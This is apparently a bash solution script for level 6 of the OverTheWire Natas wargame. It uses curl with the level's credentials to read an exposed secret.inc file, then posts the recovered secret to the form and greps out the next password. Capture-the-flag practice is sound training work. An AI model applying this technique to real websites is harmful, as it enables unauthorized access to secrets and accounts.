#!/bin/bash

# This challenge give the php source code behind the form
# by comparing the input with $secret variable imported from /includes/secret.inc
# this file is publically accessable as plain text since it isn't .php extesion

USER=natas6
PASS='0RoJwHdSKWFTYR5WuiAewauSuNaBXned'

curl -fsSL -u $USER:$PASS \
  http://natas6.natas.labs.overthewire.org/includes/secret.inc

curl -fsSL -u $USER:$PASS \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "submit=XD&secret=FOEIUWGHFEEUHOFUOIU" \
  http://natas6.natas.labs.overthewire.org/ | grep password
